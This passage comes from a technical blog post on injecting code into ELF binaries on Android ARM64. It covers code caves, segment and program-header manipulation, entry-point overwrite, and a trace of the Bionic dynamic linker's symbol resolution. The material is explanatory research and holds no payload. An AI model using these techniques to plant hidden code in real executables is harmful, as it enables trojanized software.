0x00001950 a0060000 &lt;span style="color:#ae81ff">00000000&lt;/span> a0060000 &lt;span style="color:#ae81ff">00000000&lt;/span> ................
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Inserting data into the binary can now result in broken references. Lets consider the example that we want to append a new PHT - entry to PHT. Assuming the above platform and build, the PHT is located at&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --segments hello
Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
...
PHDR 0x000040 0x0000000000000040 0x0000000000000040 0x000230 0x000230 R 0x8
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Appending the PHT - entry will increase the &lt;code>PHDR&lt;/code>&amp;rsquo;s size by &lt;code>0x38&lt;/code>, which again will shift everything located after the PHT by &lt;code>0x38&lt;/code> to the back. Lets consider &lt;em>.plt&lt;/em> again&lt;/p>
&lt;pre tabindex="0">&lt;code>00000000000006e0 &amp;lt;puts@plt&amp;gt;:
6e0 + 0x38: b0000010 adrp x16, 1000 --&amp;gt; x16 = 0x1000
6e4 + 0x38: f944ae11 ldr x17, [x16, #2392] --&amp;gt; x17 = 0x1000 + 0x958 = 0x1958
6e8 + 0x38: 91256210 add x16, x16, #0x958 --&amp;gt; x16 = 0x1958
6ec + 0x38: d61f0220 br x17
&lt;/code>&lt;/pre>&lt;p>So we will still jump to the same &lt;em>.plt&lt;/em> - stub we would jump to, if we did not insert the PHT - entry. In (almost) all cases, this will give you &lt;code>SIGSEG&lt;/code> or &lt;code>SIGILL&lt;/code>. This is a problem to consider whenever new data is injected into a binary. Despite the fact that we have to take care of unpatchable references, there are also patchable references that can be changed automatically (i.e. using heuristics and math) like e.g. &lt;em>.dynamic&lt;/em> entries of tag &lt;code>DT_SYMTAB&lt;/code>.&lt;/p>
&lt;p>In addition to that, if we assumed that we inserted a loadable segment, i.e. a PHT - entry of type &lt;code>PT_LOAD&lt;/code>, then the binary might crash with high probability (for me it crashed on every test). Regarding the &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1147">kernel&lt;/a>, loadable segments are allowed to overlap, which coincides with &lt;a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html">System V gABI&lt;/a> (notice the absense of any constraints for segments in comparison to the constraints enforced for &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.sheader.html">sections&lt;/a>). This may lead to the conclusion that either inserting an overlapping loadable segment introduces the same errors regarding &lt;code>adrp&lt;/code> as described above, or the dynamic linker contains code that sends a &lt;code>SIGSEG&lt;/code> or &lt;code>SIGILL&lt;/code> based on a certain condition. As all of the techniques are tested on an Android emulator with the above platform specifications, it could also be that the translator does not like overlapping loadables (&lt;code>/system/bin/ndk_translation_program_runner_binfmt_misc_arm64&lt;/code> is definitely capable of triggering &lt;code>SIGILL&lt;/code>!).&lt;/p>
&lt;h4 id="code-cave---based-injection">Code Cave - based Injection&lt;/h4>
&lt;p>The first technique described is code injection that relies on finding unused memory between two loadable segments, i.e. segments of type &lt;code>PT_LOAD&lt;/code>. For this technique to work properly, we need to consider the following things:&lt;/p>
&lt;ol>
&lt;li>This is a segment - based approach, which means that code caves must lie &lt;strong>between&lt;/strong> two loadable segments. Thus a code cave cannot be part of the process image.&lt;/li>
&lt;li>Assuming we found a code cave, in order to put it into the process image we need to either create a new or overwrite an existing PHT - entry such that it points to the code cave. Or we need to expand one of the surrounding loadable segments. The latter is hard, because loadable segments may theoretically contain other loadable segments. Therefore only &amp;ldquo;top - level&amp;rdquo; loadable segments are used to search for code caves.&lt;/li>
&lt;li>Segment - based code caves need to be searched for with respect to the file offsets and file sizes of the &amp;ldquo;top - level&amp;rdquo; loadable segments, because the code injection takes place in the file on disk, not at runtime. Again there is a problem, because the size of a segment on disk &lt;code>p_filesz&lt;/code> may be strictly less than the size in the process image &lt;code>p_memsz&lt;/code>. Appending a code cave to a loadable segment with &lt;code>p_filesz &amp;lt; p_memsz&lt;/code> may result in the injected code being overwritten by the application. Also, if combined with a PHT - based injection, one can set the virtual address and memory size to another code cave in process image.&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/ch5.pheader.html">System V gABI&lt;/a> states that PHT - entries of loadable segments must be sorted ascendingly wrt. their virtual addresses. Therefore the combination of a code cave with overwriting/creating PHT - entries is further limited to the order of PHT - entries. In practice it seems that we can derive from the &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1138">kernel code&lt;/a> that only the first loadable segment needs to have the smallest virtual address s.t. &lt;code>load_bias&lt;/code> is correctly set (see also the &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=544">dynamic linker code&lt;/a> responsible for calculating the &lt;code>load_bias&lt;/code> for ELF - files loaded by the kernel). There seem to be no checks regarding the order of loadable segments as regards their virtual addresses.&lt;/li>
&lt;/ol>
&lt;p>Notice that inserting a PHT - entry to point to the code cave will cause all the problems described in &lt;a href="#code-injection">Code Injection&lt;/a>.&lt;/p>
&lt;p>Injecting code into segment - based code caves is a simple and often stable way to get a binary to execute custom code. Of course seeking code caves can among other things involve analysing control flow to detect &amp;ldquo;dead&amp;rdquo; code in e.g. &lt;em>.text&lt;/em> that can be overwritten.&lt;/p>
&lt;p>The following figure illustrates overwriting an existing PHT - entry such that it points to a segment - based code cave.
&lt;img src="https://lolcads.github.io/2022/07/injection_segment_override_code_cave.png" alt="Overwrite PHT - entry plus code cave">&lt;/p>
&lt;h4 id="segment---based-injection">Segment - based Injection&lt;/h4>
&lt;p>This technique involves everything related to segments that is not already part of &lt;a href="#code-cave---based-injection">code cave - based injection&lt;/a>. To be precise, the following subtechniques can be formed:&lt;/p>
&lt;ol>
&lt;li>Overwrite an existing PHT - entry and overwrite an existing memory region. This is an abstraction of overwriting an existing PHT - entry such that it points to a segment - based code cave. Of course the PHT - entry should point to the overwritten memory, which can be a segment that is not part of the process image or something else.&lt;/li>
&lt;li>Overwrite an existing PHT - entry and insert new memory to be interpreted as a segment. Inserting new memory will result in problems related to cross - references described in &lt;a href="#code-injection">Code Injection&lt;/a>. Also this will result in a &amp;ldquo;dead&amp;rdquo; memory region, because the memory region the overwritten PHT - entry was referencing is not interpreted as a segment anymore.&lt;/li>
&lt;li>Insert a new PHT - entry and overwrite an existing memory region. This is again an abstraction of a code cave - based injection technique, but now arbitrary memory can be interpreted as a segment (notice that the memory region we overwrite is not limited to memory regions between loadable segments as in &lt;a href="#code-cave---based-injection">Code - Cave - based Injection&lt;/a>). Although it can happen that two PHT - entries reference the same memory region. Again note that inserting a new PHT - entry may invalidate cross - references.&lt;/li>
&lt;li>Finally one can insert a new PHT - entry and a new memory region. As long as one can manage validating cross - references, this technique is the least intrusive one and is even reversible.&lt;/li>
&lt;/ol>
&lt;p>The following figure depicts inserting a completely new segment:
&lt;img src="https://lolcads.github.io/2022/07/injection_segment_inject_inject_memory.png" alt="Insert PHT - entry plus new memory">&lt;/p>
&lt;p>Thinking back to &lt;a href="#rule-of-two">using two parsers&lt;/a>, we can see that the &amp;ldquo;mixed&amp;rdquo; techniques are problematic. To be precise, after calling &lt;code>rawelf_injection&lt;/code>, LIEF will cause a segmentation fault during its parsing phase. It might be related to the fact that both &amp;ldquo;mixed&amp;rdquo; techniques result in some form of &amp;ldquo;dead&amp;rdquo; memory, i.e. either a &amp;ldquo;dead&amp;rdquo; PHT - entry or a &amp;ldquo;dead&amp;rdquo; memory region. A solution is to avoid reparsing, i.e. call &lt;code>rawelf_injection&lt;/code> independently from LIEF.&lt;/p>
&lt;h3 id="code-execution">Code Execution&lt;/h3>
&lt;p>Making already injected code executable is key to seeing any signs of life of our code. Technically speaking, there is a plethora of ways to make code executable, but most of them are highly platform - dependent. Thus we try to focus on the most abstract methods to archive code execution.&lt;/p>
&lt;p>LIEF fully supports all following approaches, which prevents compatibility issues between the two parsers.&lt;/p>
&lt;h4 id="entry-point">Entry Point&lt;/h4>
&lt;p>The most natural approach is to overwrite the entry point address &lt;code>e_entry&lt;/code> located in the ELF - header. However, it might be unclear what to write into &lt;code>e_entry&lt;/code> at the first glance. &lt;code>e_entry&lt;/code> is a &lt;strong>virtual address&lt;/strong> pointing to the first instruction executed after the OS/dynamic linker is done setting up the execution environment. As all code injection techniques discussed above work with &lt;strong>file offsets&lt;/strong>, there needs to be a translation from file offet to virtual address. Fortunately, LIEF provides us with a function that does exactly that&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">vaddr &lt;span style="color:#f92672">=&lt;/span> binary&lt;span style="color:#f92672">.&lt;/span>offset_to_virtual_address(off)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Theoretically the conversion can be done manually aswell. For that assume that the injected code is part of a loadable segment (of type &lt;code>Elf64_Phdr&lt;/code>). Then&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">vaddr &lt;span style="color:#f92672">=&lt;/span> (off &lt;span style="color:#f92672">-&lt;/span> seg&lt;span style="color:#f92672">.&lt;/span>p_offset) &lt;span style="color:#f92672">+&lt;/span> seg&lt;span style="color:#f92672">.&lt;/span>p_vaddr
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Intuition behind that is that the relative offset of a structure to the beginning of the segment that contains the structure will remain the same, regardless of whether we are in the process image or in the file. Note that this conversion might &lt;strong>not work in general&lt;/strong>.&lt;/p>
&lt;p>The following picture shows the general idea of this technique:
&lt;img src="https://lolcads.github.io/2022/07/execution_override_entry.png" alt="Overwrite entry point">&lt;/p>
&lt;h4 id="dynsym---based-injection">&lt;em>.dynsym&lt;/em> - based Injection&lt;/h4>
&lt;p>Another idea to make code executable would be to define a symbol such that it points to the injected code. This technique is &lt;strong>dependent on the &lt;em>Dynamic Linker&lt;/em>&lt;/strong>, because the dynamic linker determines how a symbol is resolved at runtime. We would need the following assumptions:&lt;/p>
&lt;ol>
&lt;li>Dynamic Linker will not resolve a symbol, if there is already a non - zero definition in &lt;em>.dynsym&lt;/em>, and will use that existing definition.&lt;/li>
&lt;li>Target binary uses &lt;em>Dynamic Linking&lt;/em>.&lt;/li>
&lt;li>&lt;em>.dynamic&lt;/em> neither contains an entry with tag &lt;code>DT_BIND_NOW&lt;/code> nor any other platform - dependent entry that enforces non - lazy binding. Also there must not be an entry with tag &lt;code>DT_FLAGS&lt;/code> and value &lt;code>DF_BIND_NOW&lt;/code>. This is rather nice to have than necessary, because lazy binding allows for injected code to be executed before a symbol is resolved, thus leaving a time window, in which symbol resolution can be manipulated.&lt;/li>
&lt;/ol>
&lt;p>This time we are out of luck though. At least one of the above assumptions does not hold on our target platform and thus this technique is not applicable! If we were to manipulate relocations, we might be able to get a similar technique to work. Although it would not require &lt;em>.dynsym&lt;/em>.&lt;/p>
&lt;h5 id="the-tradegy-of-lazy-binding">The Tradegy of Lazy Binding&lt;/h5>
&lt;p>For this section we assume that we are looking at an Android OS (e.g. 12) on an ARM64 (i.e. AARCH64) architecture. For these platform specifications I want to explain that the dynamic linker &lt;strong>always&lt;/strong> uses &lt;code>BIND_NOW&lt;/code>, i.e. non - lazy binding!&lt;/p>
&lt;p>Lets remember that, if we execute a binary (e.g. using &lt;code>execve&lt;/code>), the kernel will load the binary into memory. According to &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2082">AOSP&lt;/a>, we can derive the following call stack:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Order&lt;/th>
&lt;th>Function Call&lt;/th>
&lt;th>Line&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1.&lt;/td>
&lt;td>&lt;code>syscall(execve, argv, envp)&lt;/code>&lt;/td>
&lt;td>-&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2.&lt;/td>
&lt;td>&lt;code>do_execve(getname(filename), argv, envp)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2087">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3.&lt;/td>
&lt;td>&lt;code>do_execveat_common(AT_FDCWD, filename, argv, envp, 0)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=2011">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4.&lt;/td>
&lt;td>&lt;code>bprm_execve(bprm, fd, filename, flags)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1941">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5.&lt;/td>
&lt;td>&lt;code>exec_binprm(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1836">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>6.&lt;/td>
&lt;td>&lt;code>search_binary_handler(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1767">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>7.&lt;/td>
&lt;td>&lt;code>fmt-&amp;gt;load_binary(bprm)&lt;/code>&lt;/td>
&lt;td>&lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/exec.c;l=1726">line&lt;/a>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>In the file &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=100">&lt;code>common/fs/binfmt_elf.c&lt;/code>&lt;/a> we can find the corresponding binary format that is registering &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=824">&lt;code>load_elf_binary&lt;/code>&lt;/a> as the function that is called last in the call stack. Investigating that function leads us to the conclusion that the kernel may handle loading the binary. Also we can see that if the program to be executed uses an interpreter, i.e. there is a segment of type &lt;code>PT_INTERP&lt;/code>, then the kernel will &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1260">set the entry point to the entry point of the interpreter&lt;/a> and &lt;a href="https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/fs/binfmt_elf.c;l=1348">start a thread at this entry point&lt;/a>.&lt;/p>
&lt;p>This brings us to the dynamic linker, whose &amp;ldquo;nice&amp;rdquo; entry point is &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=311">&lt;code>linker_main&lt;/code>&lt;/a>. Of course we assume that we are looking at a binary that has at least one &lt;code>DT_NEEDED&lt;/code> - entry in &lt;em>.dynamic&lt;/em>. This will trigger a call to the function &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_main.cpp;l=483">&lt;code>find_libraries&lt;/code>&lt;/a>. This function tries to load all dynamic dependencies in a very complex way. Eventually it will call &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker.cpp;l=1760;drc=beeaf36389bde1c5db8a676df575348f47e68594">&lt;code>soinfo::link_image&lt;/code>&lt;/a> with a lookup list containing descriptions of shared libraries to consider while linking:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>link_image(lookup_list, local_group_root, link_extinfo, &lt;span style="color:#f92672">&amp;amp;&lt;/span>relro_fd_offset) &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">!&lt;/span>get_cfi_shadow()&lt;span style="color:#f92672">-&amp;gt;&lt;/span>AfterLoad(si, solist_get_head())) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Within &lt;code>soinfo::link_image&lt;/code>, there is a sneaky call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker.cpp;l=3277">&lt;code>relocate&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>relocate(lookup_list)) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We know that the first &lt;em>.plt&lt;/em> - entry will lookup symbols, if the corresponding functions are called for the first time, in case of lazy binding. This means that we now expect corresponding relocations to take place s.t. &lt;em>.got.plt&lt;/em> (according to &lt;a href="https://maskray.me/blog/2021-08-29-all-about-global-offset-table">this&lt;/a>, &lt;em>.got.plt&lt;/em> holds symbol addresses used by &lt;em>.plt&lt;/em> - entries) eventually contains all function addresses before the program gets in control. Thus we will look for &lt;code>R_AARCH64_JUMP_SLOT&lt;/code> relocation types. Assuming the dynamic linker is compiled with &lt;code>USE_RELA&lt;/code>, it will &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=640">run&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>plain_relocate&lt;span style="color:#f92672">&amp;lt;&lt;/span>RelocMode&lt;span style="color:#f92672">::&lt;/span>JumpTable&lt;span style="color:#f92672">&amp;gt;&lt;/span>(relocator, plt_rela_, plt_rela_count_)) {
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Following the one-liners we will wind up in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=160">&lt;code>process_relocation_impl&lt;/code>&lt;/a>. As we are assuming that our relocation type of interest is &lt;code>R_AARCH64_JUMP_SLOT&lt;/code>, we get that its &lt;code>r_sym&lt;/code> refers to the corresponding &lt;em>.dynsym&lt;/em> - entry and is thus &lt;strong>not&lt;/strong> 0. This will result in an &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=280">&lt;code>r_sym == 0&lt;/code> - check&lt;/a> to be false, which triggers a symbol lookup in the corresponding &lt;code>else&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>if (!lookup_symbol&amp;lt;IsGeneral&amp;gt;(relocator, r_sym, sym_name, &amp;amp;found_in, &amp;amp;sym)) return false;
&lt;/code>&lt;/pre>&lt;p>(btw. the &lt;code>relocator&lt;/code> contains &lt;code>lookup_list&lt;/code>).&lt;/p>
&lt;p>Again following the control flow will reveal a call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=108">&lt;code>soinfo_do_lookup&lt;/code>&lt;/a>:&lt;/p>
&lt;pre tabindex="0">&lt;code>... soinfo_do_lookup(sym_name, vi, &amp;amp;local_found_in, relocator.lookup_list);
&lt;/code>&lt;/pre>&lt;p>which, after following one - liners again, brings us to a function called &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=119">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a>. This function will resolve a given symbol by name utilising the hash sections and symbol versioning. Eventually, it returns an instance of &lt;code>Elf64_Sym&lt;/code> that is forwarded all the way back to &lt;code>process_relocation_impl&lt;/code>. It will be used to compute the correct address of the symbol via&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">ElfW(Addr) resolve_symbol_address(&lt;span style="color:#66d9ef">const&lt;/span> ElfW(Sym)&lt;span style="color:#f92672">*&lt;/span> s) &lt;span style="color:#66d9ef">const&lt;/span> {
&lt;span style="color:#66d9ef">if&lt;/span> (ELF_ST_TYPE(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STT_GNU_IFUNC) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">call_ifunc_resolver&lt;/span>(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_value &lt;span style="color:#f92672">+&lt;/span> load_bias);
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>ElfW(Addr)&lt;span style="color:#f92672">&amp;gt;&lt;/span>(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_value &lt;span style="color:#f92672">+&lt;/span> load_bias);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As most symbols are of type &lt;code>STT_FUNC&lt;/code>, we just consider the second return statement.&lt;/p>
&lt;p>Finally, the result of &lt;code>resolve_symbol_address(sym)&lt;/code> is stored in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.cpp;l=289">&lt;code>sym_addr&lt;/code>&lt;/a> and used in&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">constexpr&lt;/span> (IsGeneral &lt;span style="color:#f92672">||&lt;/span> Mode &lt;span style="color:#f92672">==&lt;/span> RelocMode&lt;span style="color:#f92672">::&lt;/span>JumpTable) {
&lt;span style="color:#66d9ef">if&lt;/span> (r_type &lt;span style="color:#f92672">==&lt;/span> R_GENERIC_JUMP_SLOT) {
count_relocation_if&lt;span style="color:#f92672">&amp;lt;&lt;/span>IsGeneral&lt;span style="color:#f92672">&amp;gt;&lt;/span>(kRelocAbsolute);
&lt;span style="color:#66d9ef">const&lt;/span> ElfW(Addr) result &lt;span style="color:#f92672">=&lt;/span> sym_addr &lt;span style="color:#f92672">+&lt;/span> get_addend_norel();
trace_reloc(&lt;span style="color:#e6db74">&amp;#34;RELO JMP_SLOT %16p &amp;lt;- %16p %s&amp;#34;&lt;/span>,
rel_target, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&amp;gt;&lt;/span>(result), sym_name);
&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>ElfW(Addr)&lt;span style="color:#f92672">*&amp;gt;&lt;/span>(rel_target) &lt;span style="color:#f92672">=&lt;/span> result;
&lt;span style="color:#66d9ef">return&lt;/span> true;
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will write the address of the symbol into the corresponding &lt;em>.got.plt&lt;/em> - entry.&lt;/p>
&lt;p>All in all this happens at startup of a program. We started at &lt;code>execve&lt;/code> and only considered dynamic linker code that is executed before the program gets in charge (i.e. before the dynamic linker returns from &lt;code>linker_main&lt;/code>). Therefore the dynamic linker always uses &lt;code>BIND_NOW&lt;/code>.&lt;/p>
&lt;h5 id="symbol-hashing-and-lief">Symbol Hashing and LIEF&lt;/h5>
&lt;p>In order to quickly determine, whether a symbol is defined in an ELF - file, two sections can be utilised:&lt;/p>
&lt;ol>
&lt;li>&lt;em>.gnu.hash&lt;/em>&lt;/li>
&lt;li>&lt;em>.hash&lt;/em>&lt;/li>
&lt;/ol>
&lt;p>We will only focus on &lt;em>.gnu.hash&lt;/em>, because it suffices for showcasing the problem.&lt;/p>
&lt;p>From the previous section we know that the dynamic linker performs a symbol lookup via &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=119">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a>. To be precise, it will iterate over all libraries defined in &lt;code>lookup_list&lt;/code> and use the Bloom filter in &lt;em>.gnu.hash&lt;/em> to check whether a symbol is defined in an ELF - file or not. If the Bloom filter &amp;ldquo;says no&amp;rdquo;, the symbol is &lt;strong>not&lt;/strong> defined in that ELF - file with probability assumed to be 100%. If the Bloom filter &amp;ldquo;says probably yes&amp;rdquo;, then further checks are needed to identify whether the symbol is really defined in that ELF - file (for those interested, see &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=151">this&lt;/a>).&lt;/p>
&lt;p>This implies that there needs to be an entry in &lt;em>.gnu.hash&lt;/em> in order for the dynamic linker to take a corresponding symbol definition into account. Unfortunately, LIEF does &lt;strong>not&lt;/strong> create a new entry in &lt;em>.gnu.hash&lt;/em> upon adding a new symbol to &lt;em>.dynsym&lt;/em>. Neither does &lt;code>rawelf_injection&lt;/code>, as it was designed according to &lt;em>System V gABI&lt;/em>, which does not even mention &lt;em>.gnu.hash&lt;/em>. Therefore overwriting an existing symbol in &lt;em>.dynsym&lt;/em> using &lt;code>rawelf_injection&lt;/code> will also not create/overwrite a &lt;em>.gnu.hash&lt;/em> - entry. This leaves us with overwriting symbols, whose symbol names are already defined in &lt;em>.gnu.hash&lt;/em> of the ELF - file we are manipulating. Thus we cannot overwrite symbols that are defined in other shared object files unless we manipulate the respective libraries. Lets assume we have a symbol to overwrite, then there is a limitation to what the corresponding &lt;em>.dynsym&lt;/em> - entry must look like. Notice that in &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=187">&lt;code>soinfo_do_lookup_impl&lt;/code>&lt;/a> there is a call to &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_relocate.h;l=60">&lt;code>is_symbol_global_and_defined&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">bool&lt;/span> &lt;span style="color:#a6e22e">is_symbol_global_and_defined&lt;/span>(&lt;span style="color:#66d9ef">const&lt;/span> soinfo&lt;span style="color:#f92672">*&lt;/span> si, &lt;span style="color:#66d9ef">const&lt;/span> ElfW(Sym)&lt;span style="color:#f92672">*&lt;/span> s) {
&lt;span style="color:#66d9ef">if&lt;/span> (__predict_true(ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STB_GLOBAL &lt;span style="color:#f92672">||&lt;/span>
ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">==&lt;/span> STB_WEAK)) {
&lt;span style="color:#66d9ef">return&lt;/span> s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_shndx &lt;span style="color:#f92672">!=&lt;/span> SHN_UNDEF;
} &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (__predict_false(ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info) &lt;span style="color:#f92672">!=&lt;/span> STB_LOCAL)) {
DL_WARN(&lt;span style="color:#e6db74">&amp;#34;Warning: unexpected ST_BIND value: %d for &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74"> in &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74"> (ignoring)&amp;#34;&lt;/span>,
ELF_ST_BIND(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_info), si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>get_string(s&lt;span style="color:#f92672">-&amp;gt;&lt;/span>st_name), si&lt;span style="color:#f92672">-&amp;gt;&lt;/span>get_realpath());
}
&lt;span style="color:#66d9ef">return&lt;/span> false;
}
